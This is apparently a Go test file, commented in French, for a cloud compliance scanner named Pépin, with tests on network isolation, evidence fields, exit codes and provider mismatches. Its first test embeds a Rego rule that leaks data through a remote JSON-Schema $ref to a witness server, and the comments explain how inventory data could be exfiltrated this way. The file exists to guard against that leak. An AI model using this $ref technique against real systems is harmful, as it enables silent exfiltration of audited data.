package cmd

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
)

// Une règle chargée par `--policy-dir` est du CODE TIERS, exécuté sur un inventaire
// qui contient tout ce que le scan a collecté. Elle ne doit jamais atteindre le
// réseau — sans quoi Pépin devient le véhicule d'exfiltration de ce qu'il audite.
//
// Le moteur retire `http.send`, `net.lookup_ip_addr` et `opa.runtime` de son jeu de
// capacités, ce qui a longtemps suffi à le dire. C'était faux : OPA résout le `$ref`
// distant d'un JSON-Schema par HTTP AU MOMENT DE L'ÉVALUATION, sur un chemin qui ne
// passe par aucun builtin. Mesuré contre scankit v0.2.2, que ce dépôt épinglait :
// la requête partait, l'inventaire sortait, et `Evaluate` ne rendait AUCUNE erreur.
// Le silence est la partie qui compte — rien, chez un consommateur, n'aurait paru
// anormal.
//
// Cette garde ne lit pas le code, elle TEND UN TÉMOIN. C'est la seule façon de
// prouver un refus réseau : une lecture de source ne prouve rien, un serveur qui
// reste muet si. Elle vaut aussi contre une régression d'ÉPINGLAGE — une remontée
// de version en arrière rendrait la brèche sans que rien d'autre ne rougisse.
func TestNoThirdPartyPolicyCanReachTheNetwork(t *testing.T) {
	var atteint atomic.Int32
	temoin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		atteint.Add(1)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"type": "object"})
	}))
	defer temoin.Close()

	dir := t.TempDir()
	// Le `$ref` distant : aucun builtin réseau n'est appelé, c'est le chargeur de
	// schémas d'OPA qui sort. Interpoler l'inventaire dans le chemin est ce qui
	// transformerait la fuite en exfiltration ciblée.
	regle := `package pepin.rules

import rego.v1

deny contains f if {
	json.match_schema(input, {"$ref": "` + temoin.URL + `/leak/EXFIL-TOKEN"})
	f := {
		"code": "compute_instance_has_security_group",
		"severity": "low",
		"subject": "x",
		"message": "x",
		"remediation": "x",
		"labels": {
			"provider": "scaleway",
			"category": "security",
			"confidence": "confirmed",
			"message_en": "x",
			"remediation_en": "x",
		},
	}
}
`
	if err := os.WriteFile(filepath.Join(dir, "leak.rego"), []byte(regle), 0o600); err != nil {
		t.Fatalf("écriture de la règle témoin : %v", err)
	}

	bin := buildPepin(t)
	// Le scan peut échouer ou non : ce qui se mesure ici n'est pas son verdict, c'est
	// si le témoin a été touché.
	_, _ = runPepin(t, bin, nil, "scan", "scaleway", scanFixture, "--policy-dir", dir, "--format", "json")

	if n := atteint.Load(); n != 0 {
		t.Errorf("une règle tierce a atteint le réseau (%d requête(s) reçues).\n"+
			"  L'inventaire audité est sorti de la machine, en silence : `Evaluate` ne\n"+
			"  rend aucune erreur sur ce chemin. Vérifier l'épinglage de scankit —\n"+
			"  le refus réseau du chargeur de schémas exige >= v0.2.3.", n)
	}
}

// TestNoResultCarriesAnEmptyProof — l'issue #146.
//
// `evidence.proves` sortait en `["","",""]` sur CHAQUE résultat : `omitempty` sur un
// tableau de taille fixe est sans effet, et l'a toujours été. Un lecteur ne pouvait
// donc pas distinguer « aucune preuve enregistrée » de « trois preuves enregistrées,
// toutes vides » — et les blancs voyageaient jusque dans les bundles scellés, où
// personne ne peut plus les interpréter.
//
// Corrigé dans scankit v0.3.1, qui omet le champ quand rien n'y a été inscrit. Cette
// garde vit ICI parce que c'est Pépin qui publie ces dossiers : une régression
// d'épinglage remettrait les blancs sans que rien d'autre ne rougisse.
func TestNoResultCarriesAnEmptyProof(t *testing.T) {
	bin := buildPepin(t)
	stdout, _ := runPepin(t, bin, nil, "scan", "scaleway", scanFixture, "--format", "assessment")

	var doc struct {
		Results []struct {
			Control  string `json:"control"`
			Evidence struct {
				Proves []string `json:"proves"`
			} `json:"evidence"`
		} `json:"results"`
	}
	if err := json.Unmarshal([]byte(stdout), &doc); err != nil {
		t.Fatalf("sortie assessment illisible : %v", err)
	}
	if len(doc.Results) == 0 {
		t.Fatal("aucun résultat : la garde ne mesure rien")
	}
	for _, r := range doc.Results {
		for i, p := range r.Evidence.Proves {
			if p == "" {
				t.Errorf("%s : evidence.proves[%d] est une chaîne vide.\n"+
					"  Un dossier scellé porterait un blanc que personne ne peut interpréter :\n"+
					"  « aucune preuve » et « une preuve vide » ne veulent pas dire la même chose.\n"+
					"  Le champ doit être ABSENT quand rien n'y a été inscrit (scankit >= v0.3.1).",
					r.Control, i)
			}
		}
	}
}

// TestNoGateProfileTurnsARedChainGreen — l'invariant de l'issue #112, mesuré sur le
// binaire.
//
// Un profil de porte allège ce qui pèse dans le code de sortie. C'est utile, et c'est
// aussi la façon la plus discrète de casser une chaîne de CI : une équipe qui échoue
// aujourd'hui sur un écart passerait au vert après une mise à jour, sans que personne
// n'ait rien décidé. Ce serait le faux vert que cette vague a passé trois lots à
// combattre, à ceci près qu'il viendrait d'un réglage plutôt que d'une règle — donc
// invisible.
//
// La règle : un profil peut transformer un 1 en 3 (« le scan n'établit pas la
// conformité »), JAMAIS en 0. L'ordre de précédence de l'ADR-0005 tient — un écart
// resté visible rend toujours 1.
func TestNoGateProfileTurnsARedChainGreen(t *testing.T) {
	bin := buildPepin(t)
	const nonConforme = "examples/scaleway/inventory.json"

	// Référence : sans profil, cet inventaire est non conforme.
	if code := exitCodeOfArgs(t, bin, "scan", "scaleway", nonConforme); code != 1 {
		t.Fatalf("l'inventaire de référence rend %d au lieu de 1 : le test ne mesure rien", code)
	}
	for _, p := range []string{"all", "security", "compliance", "sovereignty"} {
		code := exitCodeOfArgs(t, bin, "scan", "scaleway", nonConforme, "--gate", p)
		if code == 0 {
			t.Errorf("profil %q : un inventaire NON CONFORME rend 0.\n"+
				"  Une chaîne rouge est passée au vert sans que personne ne l'ait décidé.\n"+
				"  Un profil ne peut alléger que jusqu'à 3, jamais jusqu'à 0.", p)
		}
		if code != 1 && code != 3 {
			t.Errorf("profil %q : code %d inattendu (1 ou 3 attendus)", p, code)
		}
	}
}

// TestAProviderMismatchIsRefused — l'issue #148, un faux vert P0.
//
// Scanner un inventaire Scaleway avec les règles Exoscale était accepté SANS UN MOT et
// produisait six verdicts `pass`. Ces `pass` ne sont pas faux par accident : ils sont
// vides de sens, les formes de ressources se recouvrant juste assez pour que des règles
// s'évaluent et concluent. Le mode d'échec est silencieux et réaliste — une faute de
// frappe dans un pipeline, un job copié-collé — et le rapport a l'air normal, avec un
// code de sortie non nul qui suggère même que le scan a travaillé.
//
// La matrice CROISÉE est ce qui compte : chaque fixture lue par chaque AUTRE
// fournisseur doit sortir en 2, et lue par le sien doit scanner normalement. Ne
// vérifier qu'un seul couple laisserait passer une correction qui refuserait tout.
func TestAProviderMismatchIsRefused(t *testing.T) {
	fixtures := map[string]string{
		"scaleway": "examples/scaleway/inventory.json",
		"outscale": "examples/outscale/inventory.json",
		"exoscale": "examples/exoscale/inventory.json",
	}
	bin := buildPepin(t)
	var croises int
	for propre, f := range fixtures {
		if _, err := os.Stat(filepath.Join(repoRoot, f)); err != nil {
			t.Fatalf("fixture %s absente : le test ne mesurerait rien", f)
		}
		for lu := range fixtures {
			code := exitCodeOfArgs(t, bin, "scan", lu, f)
			if lu == propre {
				if code == exitErreur {
					t.Errorf("%s lu par son PROPRE fournisseur rend %d : la correction refuse tout",
						f, code)
				}
				continue
			}
			croises++
			if code != exitErreur {
				t.Errorf("%s (fournisseur %q) lu par %q rend %d, attendu %d.\n"+
					"  Un jeu de règles rendrait des verdicts sur un inventaire qu'il n'a jamais eu\n"+
					"  à lire : un « conforme » y serait vide de sens.", f, propre, lu, code, exitErreur)
			}
		}
	}
	if croises == 0 {
		t.Fatal("aucun croisement éprouvé : la porte ne mesure rien")
	}
	t.Logf("%d croisement(s) fournisseur × inventaire refusé(s)", croises)
}
